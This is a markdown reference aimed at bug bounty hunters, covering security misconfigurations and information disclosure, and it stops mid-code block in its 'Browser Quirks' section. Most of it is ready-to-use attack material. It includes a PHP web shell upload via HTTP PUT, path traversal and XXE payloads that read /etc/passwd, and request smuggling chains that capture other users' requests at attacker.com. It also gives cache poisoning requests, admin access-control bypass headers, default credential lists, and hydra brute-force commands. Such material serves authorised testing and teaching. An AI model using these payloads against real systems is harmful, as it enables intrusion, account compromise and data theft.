# Security Misconfigurations & Information Disclosure Master Knowledgebase

> **Classification**: Research-Grade Bug Bounty Hunting Reference  
> **Scope**: Black-box testing, automation, advanced exploitation chains  
> **Sources**: PortSwigger Labs & Research, PayloadsAllTheThings, Nuclei Templates, HackTricks, OWASP, ProjectDiscovery Suite, SecLists, and cutting-edge security research.

---

## Table of Contents

1. [Basics](#basics)
2. [Security Misconfiguration Theory](#security-misconfiguration-theory)
3. [Information Disclosure Techniques](#information-disclosure-techniques)
4. [Source Code Disclosure](#source-code-disclosure)
5. [Exposed Git/SVN Attacks](#exposed-gitsvn-attacks)
6. [Backup File Discovery Payloads](#backup-file-discovery-payloads)
7. [Debug Endpoint Exploitation](#debug-endpoint-exploitation)
8. [Cloud Bucket Exposure Techniques](#cloud-bucket-exposure-techniques)
9. [Default Credential Abuse](#default-credential-abuse)
10. [Unsafe HTTP Method Exploitation](#unsafe-http-method-exploitation)
11. [Admin Panel Exposure Techniques](#admin-panel-exposure-techniques)
12. [Cache Poisoning + Misconfiguration Chains](#cache-poisoning--misconfiguration-chains)
13. [Request Smuggling + Misconfiguration Chains](#request-smuggling--misconfiguration-chains)
14. [OAuth + Misconfiguration Chains](#oauth--misconfiguration-chains)
15. [Parser Confusion Payloads](#parser-confusion-payloads)
16. [Browser Quirks](#browser-quirks)
17. [Gadget Chains](#gadget-chains)
18. [Real World Case Studies](#real-world-case-studies)
19. [Fuzzing Payloads](#fuzzing-payloads)
20. [Automation Workflows](#automation-workflows)
21. [Recon Methodology](#recon-methodology)
22. [Nuclei Templates](#nuclei-templates)
23. [Tools and Scanners](#tools-and-scanners)
24. [Advanced Research](#advanced-research)
25. [Bug Bounty Writeups](#bug-bounty-writeups)
26. [Payload Collections](#payload-collections)
27. [Detection Techniques](#detection-techniques)
28. [References](#references)

---

## Basics

### What is Security Misconfiguration?
Security misconfiguration is the most commonly seen vulnerability in the OWASP Top 10. It occurs when security settings are defined, implemented, or maintained improperly. This includes default configurations, incomplete configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages.

### What is Information Disclosure?
Information disclosure (aka information leakage) occurs when a website unintentionally reveals sensitive information to its users. This information might be sensitive to the business, its users, or the underlying infrastructure.

### Key Principles for Bug Bounty Hunters
- **Default is dangerous**: Any default configuration, credential, page, or header is a target.
- **Error messages leak architecture**: Stack traces, SQL errors, and debug pages reveal the tech stack.
- **Backup files are gold**: `.bak`, `.old`, `.zip`, `.tar.gz` of source code often contain secrets.
- **Version control exposure**: `.git`, `.svn`, `.hg` folders can reconstruct entire repositories.
- **Cloud assets are perimeter**: S3 buckets, Azure blobs, GCS buckets frequently leak data.
- **HTTP methods matter**: PUT, DELETE, TRACE, OPTIONS, PATCH can expose functionality or bypass controls.
- **Headers tell stories**: `Server`, `X-Powered-By`, `X-AspNet-Version`, `Via` reveal infrastructure.

---

## Security Misconfiguration Theory

### OWASP A6: Security Misconfiguration (2017/2021 Context)
- **Default accounts/passwords** enabled and unchanged.
- **Unnecessary features** enabled (ports, services, pages, accounts, privileges).
- **Default error handling** revealing stack traces or overly verbose errors.
- **Missing security headers** (HSTS, CSP, X-Frame-Options, etc.).
- **Software out of date** or vulnerable components.
- **Cloud storage** (S3, Azure Blob, GCS) left open.

### Attack Surface Expansion via Misconfiguration
Misconfigurations often act as **enablers** for other attacks:
- Verbose errors → Information Disclosure → Authentication Bypass
- CORS misconfig → Account Takeover
- Cache misconfig → Cache Poisoning → XSS
- Request smuggling → Bypass WAF → SSRF/RCE
- Admin panel exposure → Default creds → Full compromise

### The "Hidden Attack Surface"
Research by PortSwigger (Cracking the Lens) demonstrates that infrastructure components (CDNs, load balancers, reverse proxies) create hidden attack surfaces. Misconfigurations at this layer are invisible to traditional scanners but exploitable via:
- Host header manipulation
- Absolute URI smuggling
- Custom HTTP methods
- Header parsing differences

---

## Information Disclosure Techniques

### 1. Verbose Error Messages

When applications crash or fail, they may return detailed error messages revealing:
- Technology stack (framework, language, database)
- Internal paths and file structures
- Database schema or query structure
- API keys or connection strings (rare but critical)

**Common Triggers:**
```http
GET /?id=' HTTP/1.1
GET /?id[]=array HTTP/1.1
GET /?id=../../../etc/passwd HTTP/1.1
GET /?page=nonexistent HTTP/1.1
GET /admin HTTP/1.1
GET /?id=1 AND 1=2 HTTP/1.1
GET /?id=1' UNION SELECT NULL-- HTTP/1.1
```

**Framework-Specific Errors:**
```http
# ASP.NET
GET /trace.axd HTTP/1.1
GET /elmah.axd HTTP/1.1

# PHP
GET /?id[]= HTTP/1.1  # Array to string conversion

# Java/Spring
GET /actuator/env HTTP/1.1
GET /actuator/trace HTTP/1.1

# Django
GET /?format=json HTTP/1.1  # Debug page if DEBUG=True
GET /static/../../../../etc/passwd HTTP/1.1
```

### 2. Debug and Diagnostic Pages

**Common Debug Endpoints:**
```
/actuator
/actuator/env
/actuator/health
/actuator/metrics
/actuator/loggers
/actuator/httptrace
/actuator/threaddump
/actuator/heapdump
/actuator/mappings
/actuator/configprops
/actuator/beans

/debug
/phpinfo.php
/phpinfo
/info.php
/test.php
/_profiler/phpinfo
/_profiler/

/server-status
/server-info
/jmx-console
/web-console
/management
/management/env
/management/health
```

**Heapdump Analysis:**
Spring Boot heapdumps contain credentials in memory. Use:
```bash
# Extract strings from heapdump
strings heapdump | grep -i "password\|secret\|token\|key"

# Use Eclipse MAT or VisualVM for deeper analysis
# Look for: PropertySource, ConfigurationProperties, DataSource beans
```

### 3. Source Code Disclosure via Backup Files

See dedicated [Source Code Disclosure](#source-code-disclosure) and [Backup File Discovery](#backup-file-discovery-payloads) sections.

### 4. Information Disclosure in HTTP Headers

**Revealing Headers:**
```http
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
X-AspNet-Version: 4.0.30319
X-AspNetMvc-Version: 5.2
X-Generator: Drupal 8
X-Backend-Server: web01.internal.corp
Via: 1.1 varnish (Varnish/6.0)
X-Served-By: cache-lax1234-ALC
X-Cache: HIT
X-Cache-Hits: 2
X-Timer: S1234567890.123456
X-Request-ID: internal-trace-id-12345
X-Envoy-Upstream-Service-Time: 42
X-Amz-Cf-Id: cloudfront-distribution-id
```

**Header-Based Recon Commands:**
```bash
# Extract all headers from a list
httpx -l targets.txt -silent -json | jq -r '.headers'

# Specific header analysis
curl -sI https://target.com | grep -iE "server|powered|version|backend|via"
```

### 5. Internal Path Disclosure

**Techniques:**
- Forcing 404 errors: `GET /nonexistent12345`
- Invalid parameters: `GET /?id=invalidtype`
- File inclusion attempts: `GET /?page=../../../../etc/passwd`
- Unhandled exceptions via malformed JSON/XML

**Example Disclosure:**
```
Warning: include(/var/www/html/app/views/../../etc/passwd): 
failed to open stream: No such file or directory in 
/var/www/html/app/controllers/PageController.php on line 42
```

### 6. Version Control History Exposure

See [Exposed Git/SVN Attacks](#exposed-gitsvn-attacks).

### 7. Information Disclosure via File Name / Path Patterns

```
/.env
/.env.local
/.env.production
/.env.backup
/config.php
/config.json
/config.yaml
/config.yml
/configuration.php
/settings.php
/database.yml
/db.conf
/connection.ini
/secrets.json
/credentials.xml
```

---

## Source Code Disclosure

### Backup File Extensions

**Common Patterns:**
```
index.php~
index.php.bak
index.php.old
index.php.orig
index.php.save
index.php.swp
index.php.swo
index.php.copy
index.php.tmp
index.php.txt
index.php.zip
index.php.tar.gz
index.php.rar
index.php.7z
index.php.bkp
index.php.bck
index.php~1
index.php_1
index.php.1
index.php.sav
index.php.original
```

**Generic Discovery Payloads:**
```bash
# ffuf for backup files
ffuf -u https://target.com/FUZZ -w backup_extensions.txt   -H "User-Agent: Mozilla/5.0"

# Common backup wordlist patterns
index.{ext}~
index.{ext}.bak
index.{ext}.old
index.{ext}.orig
index.{ext}.save
index.{ext}.swp
index.{ext}.swo
index.{ext}.copy
index.{ext}.tmp
index.{ext}.txt
index.{ext}.zip
index.{ext}.tar.gz
index.{ext}.rar
index.{ext}.7z
index.{ext}.bkp
index.{ext}.bck
index.{ext}~1
index.{ext}_1
index.{ext}.1
index.{ext}.sav
index.{ext}.original
```

**Source Code Disclosure via URL Parameters:**
```http
# PHP Wrappers
GET /?page=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1
GET /?page=php://input HTTP/1.1

# Path Traversal to source
GET /?file=../../index.php HTTP/1.1
GET /?file=....//....//index.php HTTP/1.1
GET /?file=..%252f..%252findex.php HTTP/1.1

# Null byte truncation (legacy PHP)
GET /?file=index.php%00.jpg HTTP/1.1
```

**Language-Specific Source Disclosure:**
```http
# ASP.NET
GET /web.config HTTP/1.1
GET /Global.asax HTTP/1.1
GET /bin/App.dll HTTP/1.1

# Java
GET /WEB-INF/web.xml HTTP/1.1
GET /WEB-INF/classes/App.class HTTP/1.1
GET /META-INF/MANIFEST.MF HTTP/1.1

# Python/Django
GET /settings.py HTTP/1.1
GET /wsgi.py HTTP/1.1
GET /manage.py HTTP/1.1
GET /requirements.txt HTTP/1.1

# Ruby on Rails
GET /config/database.yml HTTP/1.1
GET /config/routes.rb HTTP/1.1
GET /config/secrets.yml HTTP/1.1
GET /Gemfile HTTP/1.1

# Node.js
GET /package.json HTTP/1.1
GET /server.js HTTP/1.1
GET /app.js HTTP/1.1
GET /.env HTTP/1.1
```

---

## Exposed Git/SVN Attacks

### Git Exposure

**Detection:**
```bash
# Check for exposed .git
 curl -s https://target.com/.git/HEAD | grep "ref:"
 curl -s https://target.com/.git/config | grep "\[core\]"
 curl -s https://target.com/.git/logs/HEAD | grep -i "commit"

# Directory listing check
 curl -s https://target.com/.git/ | grep -i "index\|objects\|refs"
```

**Exploitation - Full Repository Reconstruction:**
```bash
# Using git-dumper
pip install git-dumper
git-dumper https://target.com/.git/ ./target-repo

# Manual extraction with wget
wget -r -np -nH --cut-dirs=1 -R "index.html*" https://target.com/.git/

# Using GitHacker
githacker --url https://target.com/.git/ --output-dir ./output

# After dumping, analyze for secrets
cd target-repo
git log --all --source --full-history -S 'password' -p
git log --all --pretty=format:'%H' | xargs -I {} git show {} | grep -i "password\|secret\|token\|key"

# TruffleHog on extracted repo
trufflehog filesystem ./target-repo
```

**Git Objects Analysis:**
```bash
# List all objects
git cat-file --batch-check --batch-all-objects

# Extract specific commit
git cat-file -p <commit-hash>

# Search for credentials in all commits
git log --all -p | grep -iE "password|secret|token|api_key"
```

### SVN Exposure

**Detection:**
```bash
curl -s https://target.com/.svn/entries | head -20
curl -s https://target.com/.svn/wc.db | sqlite3 - "SELECT local_relpath, checksum FROM NODES"
```

**Exploitation:**
```bash
# svn-extractor
svn-extractor --url https://target.com

# Manual wc.db analysis
# If wc.db is exposed, it contains file paths and checksums
# Use the checksums to reconstruct files from .svn/pristine/
```

### Mercurial (Hg) Exposure

```bash
curl -s https://target.com/.hg/dirstate | xxd | head
curl -s https://target.com/.hg/store/00manifest.i | file -
```

### Bazaar (Bzr) Exposure

```bash
curl -s https://target.com/.bzr/README | head
curl -s https://target.com/.bzr/branch-format | head
```

### CVS Exposure

```bash
curl -s https://target.com/CVS/Entries | head
curl -s https://target.com/CVS/Root | head
```

### DS_Store Exposure (macOS)

```bash
# .DS_Store files reveal directory listings
curl -s https://target.com/.DS_Store -o ds_store
python3 -m ds_store ./ds_store  # or use nstostool
```

---

## Backup File Discovery Payloads

### Comprehensive Extension List

```
~
.bak
.bck
.backup
.bkp
.bakup
.old
.orig
.original
.save
.sav
.swp
.swo
.tmp
.temp
.copy
.txt
.zip
.tar
.tar.gz
.tgz
.tar.bz2
.rar
.7z
.sql
.dump
.db
.sqlite
.sqlite3
.log
.err
~1
~2
_1
_2
.1
.2
.bak1
.bak2
```

### Targeted Backup Discovery

```bash
# Common backup file patterns
/admin.zip
/backup.zip
/backup.tar.gz
/backup.sql
/db.sql
/database.sql
/site.zip
/website.zip
/html.zip
/public_html.zip
/www.zip
/archive.zip
/old.zip
/backup.zip
/back.zip
/backup.zip
/backup.rar
/backup.7z
/backup.tar
/backup.tar.gz
/backup.tgz
/backup.sql
/backup.sql.gz
/dump.sql
/dump.sql.gz
/db.sql
/db.sql.gz
/database.sql
/database.sql.gz
/data.sql
/backup/db.sql
/backup/database.sql
/backup/dump.sql
/admin/backup.sql
/admin/backups/dump.sql
/sql/backup.sql
```

### CMS-Specific Backups

```
/wordpress.zip
/wp.zip
/wp-content.zip
/wp-content/backup.zip
/wp-content/backups/
/wp-content/uploads/backup/
/wp-config.php~
/wp-config.php.bak
/wp-config.php.old
/wp-config.php.save
/wp-config.php.swp
/joomla.zip
/joomla/configuration.php~
/drupal.zip
/drupal/sites/default/settings.php~
/magento.zip
/magento/app/etc/env.php~
```

### Automated Discovery Commands

```bash
# Using ffuf with custom wordlist
ffuf -u https://target.com/FUZZ -w backup_files.txt   -fc 404,403 -t 50 -H "User-Agent: Mozilla/5.0"

# Using dirsearch
python3 dirsearch.py -u https://target.com -e bak,old,zip,sql,tar.gz -t 50

# Using nuclei
nuclei -u https://target.com -t http/exposures/backups/

# Using httpx for status probing
cat backup_candidates.txt | httpx -mc 200 -content-type
```

---

## Debug Endpoint Exploitation

### Spring Boot Actuator

**Endpoints:**
```
/actuator
/actuator/auditevents
/actuator/beans
/actuator/conditions
/actuator/configprops
/actuator/env
/actuator/flyway
/actuator/health
/actuator/heapdump
/actuator/httptrace
/actuator/info
/actuator/loggers
/actuator/liquibase
/actuator/metrics
/actuator/mappings
/actuator/scheduledtasks
/actuator/sessions
/actuator/shutdown
/actuator/threaddump
/actuator/trace
```

**Sensitive Data in `/actuator/env`:**
```json
{
  "profiles": ["prod"],
  "propertySources": [{
    "name": "applicationConfig: [classpath:/application.yml]",
    "properties": {
      "database.password": {"value": "SuperSecret123!", "origin": "..."},
      "api.key": {"value": "sk-live-abc123", "origin": "..."}
    }
  }]
}
```

**Heapdump Extraction:**
```bash
# Download heapdump
curl https://target.com/actuator/heapdump -o heapdump.hprof

# Extract credentials with strings
strings heapdump.hprof | grep -iE "password|secret|token|key|aws_access_key_id"

# Advanced: Use VisualVM or Eclipse MAT to inspect char[] and String objects
# Look for: DataSource, Properties, Environment, ConfigurationProperties
```

### Django Debug Mode

**Trigger:**
```http
GET /?format=json HTTP/1.1
# Or any 404/500 if DEBUG=True
```

**Django Admin Exposure:**
```
/admin/
/django-admin/
```

### Laravel Debug Mode

```
/_debugbar/
/telescope/
/horizon/
```

### Symfony Profiler

```
/_profiler/
/_profiler/phpinfo
/_profiler/router
/_profiler/latest/
```

### PHP Debug Bar

```
/debugbar/
/debugbar/open?max=20&offset=0
```

### ASP.NET Trace

```
/trace.axd
/Trace.axd
```

### ELMAH (Error Logging Modules and Handlers)

```
/elmah.axd
/Elmah.axd
```

### Custom Debug Pages

```
/debug
/test
/status
/health
/healthcheck
/ping
/ready
/live
/metrics
/prometheus
```

---

## Cloud Bucket Exposure Techniques

### Amazon S3

**Bucket URL Formats:**
```
https://s3.amazonaws.com/bucket-name/
https://bucket-name.s3.amazonaws.com/
https://bucket-name.s3-website-us-east-1.amazonaws.com/
https://bucket-name.s3.us-west-2.amazonaws.com/
```

**Detection:**
```bash
# List bucket contents
curl https://bucket-name.s3.amazonaws.com/

# Check bucket policy
curl https://bucket-name.s3.amazonaws.com/?policy

# Check ACL
curl https://bucket-name.s3.amazonaws.com/?acl

# Check versioning
curl https://bucket-name.s3.amazonaws.com/?versions

# Check location
curl https://bucket-name.s3.amazonaws.com/?location
```

**S3 Bucket Enumeration:**
```bash
# Using s3scanner
python3 s3scanner.py -d target.com

# Using nuclei
nuclei -u target.com -t http/exposures/

# Using cloud_enum
python3 cloud_enum.py -k target

# Manual permutation
for name in $(cat permutations.txt); do
  curl -s -o /dev/null -w "%{http_code}" https://$name.s3.amazonaws.com/
done
```

### Google Cloud Storage (GCS)

```
https://storage.googleapis.com/bucket-name/
https://bucket-name.storage.googleapis.com/
```

**Detection:**
```bash
curl https://storage.googleapis.com/bucket-name/
curl https://storage.googleapis.com/storage/v1/b/bucket-name/acl
```

### Azure Blob Storage

```
https://account-name.blob.core.windows.net/container-name/
https://account-name.blob.core.windows.net/container-name/blob-name
```

**Detection:**
```bash
curl https://account-name.blob.core.windows.net/container-name?restype=container&comp=list
```

### DigitalOcean Spaces

```
https://bucket-name.nyc3.digitaloceanspaces.com/
```

### Alibaba Cloud OSS

```
https://bucket-name.oss-cn-hangzhou.aliyuncs.com/
```

### Cloud Bucket Hunting Methodology

1. **Subdomain enumeration**: `assets.target.com`, `cdn.target.com`, `storage.target.com`
2. **Permutation**: `{company}-assets`, `{company}-backup`, `{company}-dev`, `{company}-prod`
3. **GitHub dorking**: `target.com s3.amazonaws.com`, `target.com storage.googleapis.com`
4. **JavaScript analysis**: Look for bucket URLs in frontend code
5. **Wayback Machine**: Historical references to cloud storage

---

## Default Credential Abuse

### Common Default Credentials

```
admin:admin
admin:password
admin:123456
admin:admin123
administrator:administrator
administrator:password
root:root
root:password
guest:guest
test:test
demo:demo
```

### Device/Platform-Specific Defaults

```
# Apache Tomcat
tomcat:tomcat
admin:admin
manager:manager

# Jenkins
admin:admin
admin:password

# Grafana
admin:admin
admin:grafana

# Elasticsearch
elastic:changeme

# Kibana
elastic:changeme

# MongoDB Express
admin:pass

# phpMyAdmin
root: (empty)
root:root

# WordPress
admin:admin
admin:password

# WebLogic
weblogic:weblogic
weblogic:weblogic1

# JBoss
admin:admin

# Axis2
admin:axis2

# HP printers
admin:admin

# Cisco
cisco:cisco
admin:admin

# Apache Axis
admin:axis

# Zabbix
Admin:zabbix

# Splunk
admin:changeme

# Nagios
nagiosadmin:nagiosadmin

# cPanel
root:root

# Plex
admin:admin

# GitLab
root:5iveL!fe

# AWX/Tower
admin:password

# HashiCorp Vault
root: (initial root token)

# Kubernetes Dashboard
admin:admin
```

### Default Credential Discovery Commands

```bash
# Using nuclei default-login templates
nuclei -u https://target.com -t http/default-logins/

# Using patator for brute force
patator http_fuzz url=https://target.com/login.php   method=POST body='user=FILE0&pass=FILE1'   0=users.txt 1=passwords.txt -x ignore:fgrep='Invalid'

# Using hydra
hydra -L users.txt -P passwords.txt target.com http-post-form   "/login.php:user=^USER^&pass=^PASS^:Invalid"
```

---

## Unsafe HTTP Method Exploitation

### Dangerous Methods

```
PUT    - Upload files to the server
DELETE - Remove files from the server
TRACE  - Reflects request (XST - Cross-Site Tracing)
CONNECT - Tunnel connections (proxy abuse)
OPTIONS - Reveals allowed methods (recon)
PATCH  - Partial resource modification
TRACK  - Similar to TRACE (IIS legacy)
DEBUG  - Starts debugging session (ASP.NET)
```

### Method Testing

```bash
# Check allowed methods
curl -X OPTIONS -i https://target.com/
curl -X OPTIONS -i https://target.com/upload.php

# Test PUT
curl -X PUT -d "<?php system(\$_GET['cmd']); ?>"   https://target.com/shell.php

# Test DELETE
curl -X DELETE https://target.com/shell.php

# Test TRACE (XST)
curl -X TRACE -H "Cookie: session=abc123" https://target.com/

# Test DEBUG (ASP.NET)
curl -X DEBUG https://target.com/
```

### PUT Upload Exploitation

```bash
# Upload web shell via PUT
curl -X PUT --data-binary @shell.php https://target.com/shell.php

# If PUT is allowed but path restricted, try:
curl -X PUT --data-binary @shell.php https://target.com/shell.php%00.jpg

# WebDAV specific
curl -X PUT -T shell.php https://target.com/webdav/shell.php
```

### OPTIONS Recon

```bash
# Mass check for PUT/DELETE
cat targets.txt | while read url; do
  methods=$(curl -s -X OPTIONS -i "$url" | grep -i "allow:")
  echo "$url: $methods"
done
```

---

## Admin Panel Exposure Techniques

### Common Admin Paths

```
/admin
/administrator
/admin/login
/admin/login.php
/admin/login.html
/admin/index.php
/admin/index.html
/adminpanel
/admin-panel
/admin_area
/adminarea
/admincp
/admincontrol
/admin/login.aspx
/admin/login.jsp
/admin/login.do
/manager
/management
/console
/dashboard
/backend
/backoffice
/backoffice/login
/cpanel
/whm
/plesk
/phpmyadmin
/phpMyAdmin
/pma
/myadmin
/mysqladmin
/sqladmin
/roundcube
/webmail
/horde
/squirrelmail
/postfixadmin
/iredadmin
```

### CMS-Specific Admin Paths

```
# WordPress
/wp-admin/
/wp-login.php

# Joomla
/administrator/

# Drupal
/user/login
/admin

# Magento
/admin

# Django
/admin/
/django-admin/

# Laravel
/admin

# Symfony
/admin

# Ruby on Rails
/admin
/rails_admin

# ASP.NET
/admin
/Admin
/Login.aspx
```

### Admin Panel Bypass Techniques

```http
# IP-based restrictions bypass
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Host header bypass
Host: localhost
Host: 127.0.0.1

# Case variation
GET /ADMIN/ HTTP/1.1
GET /Admin/ HTTP/1.1
GET /admin../ HTTP/1.1
GET /admin;/ HTTP/1.1

# Path traversal within admin
GET /admin/../admin HTTP/1.1
GET /admin/./ HTTP/1.1
GET /admin/.;/ HTTP/1.1
GET /admin%20/ HTTP/1.1
GET /admin%09/ HTTP/1.1
GET /admin%00/ HTTP/1.1
GET /admin.json HTTP/1.1
GET /admin.html HTTP/1.1
GET /admin.php HTTP/1.1
GET /admin.zip HTTP/1.1
```

---

## Cache Poisoning + Misconfiguration Chains

### Web Cache Poisoning Theory

Web cache poisoning involves tricking a cache into storing a malicious response that is served to other users. Misconfigurations in caching headers or cache key handling enable this.

### Cache Key vs Cacheable Content

The cache key is what the cache uses to index responses. If unkeyed inputs influence the response, poisoning is possible.

**Unkeyed Headers/Inputs:**
- `X-Forwarded-Host`
- `X-Forwarded-Scheme`
- `X-Original-URL`
- `X-Rewrite-URL`
- `X-HTTP-Method-Override`
- `Accept-Encoding`
- `Accept-Language`
- `User-Agent`
- `Cookie` (sometimes)
- `Origin`
- Custom headers

### Cache Poisoning Payloads

```http
# Basic cache poisoning via X-Forwarded-Host
GET /?cb=1 HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Poisoning with redirect
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: https

# Cache key injection via parameter cloaking
GET /?utm_content=abc;callback=alert(1) HTTP/1.1
Host: target.com

# Using unkeyed method override
GET /api/user HTTP/1.1
Host: target.com
X-HTTP-Method-Override: DELETE
```

### Cache Deception + Poisoning Chain

```http
# Step 1: Find a cacheable endpoint that reflects input
GET /profile?name=<img src=x onerror=alert(1)> HTTP/1.1
Host: target.com

# Step 2: Poison the cache with a crafted request
GET /profile?name=<img src=x onerror=alert(document.cookie)> HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Accept-Encoding: gzip, attacker-controlled

# Step 3: Victim visits /profile and gets poisoned response
```

### Web Cache Entanglement

Research by PortSwigger shows that caches can become "entangled" when:
- Different paths share cache keys due to normalization bugs
- Query parameters are improperly stripped
- Path parameters are treated as query parameters

**Exploitation:**
```http
# If /api/v1/users and /api/v1/admin share cache keys due to normalization
GET /api/v1/users/../../admin HTTP/1.1
Host: target.com

# Or via parameter cloaking
GET /api/v1/users;admin=true HTTP/1.1
Host: target.com
```

### Cache Poisoning via HTTP Request Smuggling

```http
# CL.TE smuggling to poison cache
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /poison HTTP/1.1
Host: target.com
X-Poison: <script>alert(1)</script>

# The smuggled request poisons the cache for the next user's GET / request
```

---

## Request Smuggling + Misconfiguration Chchains

### HTTP Request Smuggling Basics

Request smuggling occurs when front-end and back-end servers disagree on request boundaries. This is enabled by misconfigurations in:
- Content-Length and Transfer-Encoding handling
- Connection reuse (keep-alive)
- Chunked encoding parsing

### CL.TE (Content-Length -> Transfer-Encoding)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Transfer-Encoding -> Content-Length)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

5
SMUGGLED
0

```

### TE.TE (Transfer-Encoding confusion)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked
Transfer-encoding: identity

5
SMUGGLED
0

```

### Advanced Smuggling Techniques

```http
# Chunk size manipulation
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5;xxx=
SMUGGLED
0

# Chunk extension with quotes
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5;ignore="this"
SMUGGLED
0

# Obfuscated TE header
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

5
SMUGGLED
0

# Using deprecated line endings
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5

SMUGGLED

0



```

### Browser-Powered Desync Attacks

Modern request smuggling can be triggered from the browser via:
- Fetch API with custom headers
- POST requests with specific Content-Types
- CORS misconfigurations allowing crafted requests

**Key Research:**
- Single-packet attack: Send entire attack in one TCP packet
- Client-side desync: Browser sends ambiguous requests

### Request Smuggling Chains

```http
# 1. Bypass front-end access controls
POST / HTTP/1.1
Host: target.com
Content-Length: 11
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: bar

# 2. Steal other users' requests (session hijacking)
POST / HTTP/1.1
Host: target.com
Content-Length: 33
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: attacker.com
Content-Length: 100

search=

# 3. Reflect XSS via smuggling
POST / HTTP/1.1
Host: target.com
Content-Length: 60
Transfer-Encoding: chunked

0

GET /?search=<script>alert(1)</script> HTTP/1.1
X-Ignore: x

# 4. Cache poisoning via smuggling
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

### Detection Tools

```bash
# Using http-request-smuggler (Burp extension)
# Or standalone smuggler:
python3 smuggler.py -u https://target.com

# Using Burp Suite Scanner (native detection)
# Using Param Miner (Burp extension) for CL.TE/TE.CL detection
```

---

## OAuth + Misconfiguration Chains

### OAuth 2.0 Misconfiguration Attack Surface

1. **Redirect URI manipulation**
2. **Scope escalation**
3. **State parameter bypass**
4. **PKCE bypass**
5. **Token leakage via Referer**
6. **Open Redirect in OAuth flow**
7. **Account pre-hijacking via OAuth registration**

### Redirect URI Attacks

```http
# Exact URI matching bypass via path traversal
GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com/callback/../ attacker.com/callback HTTP/1.1

# Subdomain takeover
GET /oauth/authorize?client_id=xxx&redirect_uri=https://attacker.target.com/callback HTTP/1.1

# URI scheme abuse
GET /oauth/authorize?client_id=xxx&redirect_uri=javascript://attacker.com/%0aalert(1) HTTP/1.1

# Data URI
GET /oauth/authorize?client_id=xxx&redirect_uri=data:text/html,<script>alert(1)</script> HTTP/1.1

# localhost redirect (mobile apps)
GET /oauth/authorize?client_id=xxx&redirect_uri=http://localhost:8080/callback HTTP/1.1
```

### State Parameter Bypass

```http
# Missing state parameter
GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com/callback HTTP/1.1

# Predictable state
GET /oauth/authorize?client_id=xxx&state=12345&redirect_uri=... HTTP/1.1

# State not validated
# Attacker provides their own state, victim's code is sent to attacker's redirect
```

### Authorization Code Interception

```http
# Code fixation attack
# 1. Attacker initiates OAuth flow, gets code
# 2. Attacker tricks victim into authenticating with attacker's code
# 3. Victim's account is linked to attacker's OAuth identity

# Step 1: Attacker gets auth code
GET /oauth/authorize?client_id=xxx&redirect_uri=attacker.com&response_type=code HTTP/1.1

# Step 2: Force victim to complete flow with attacker's code
# (via XSS, CSRF, or open redirect)
```

### OAuth Token Leakage

```http
# Token in URL fragment leaked via Referer
# 1. OAuth redirect sends token in fragment
# 2. Page loads resources with token in Referer header
# 3. Attacker controls one of the resources

# Mitigation bypass: If target uses hash-based routing
https://target.com/#access_token=SECRET&token_type=Bearer
```

---

## Parser Confusion Payloads

### HTTP Parser Differential Attacks

Different components (WAF, CDN, app server) parse HTTP differently. This creates bypass opportunities.

### Content-Type Parser Confusion

```http
# JSON vs Form parsing
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded

# Multiple Content-Type headers
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded

# Obfuscated Content-Type
Content-Type: application/json; charset=utf-8
Content-Type: application/json;charset=utf-8
Content-Type: application/json%3bcharset=utf-8
```

### Parameter Pollution

```http
# HPP (HTTP Parameter Pollution)
GET /?id=1&id=2&id=3 HTTP/1.1

# Different parsers pick different values
# WAF sees id=1 (first), app sees id=3 (last)

# Nested parameter pollution
GET /?user[name]=admin&user[role]=user HTTP/1.1

# Array parameter pollution
GET /?id[]=1&id[]=2 HTTP/1.1
```

### JSON Parser Confusion

```json
// Type juggling in JSON
{"id": "1 OR 1=1"}
{"id": 1, "id": "1 OR 1=1"}
{"id": [1, "1 OR 1=1"]}

// Comment injection (some parsers support comments)
{"id": /*comment*/ 1}
{"id": 1 // comment}
```

### XML Parser Attacks

```xml
<!-- XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- XInclude -->
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd"/>

<!-- DTD Retrieval (SSRF) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.target.com/secret">
]>
```

### URL Parsing Confusion

```
# Different URL parsers handle these differently
http://target.com@attacker.com
http://target.com:80@attacker.com
http://target.com%00attacker.com
http://target.com\.attacker.com
http://target.com.attacker.com
http://attacker.com%2ftarget.com
http://attacker.com/target.com
http://target.com?@attacker.com
http://target.com#@attacker.com
```

---

## Browser Quirks

### Browser Behavior Exploitation

Browsers handle edge cases differently from servers, creating desync and parsing opportunities.

### Chrome/Fetch API Quirks

```javascript
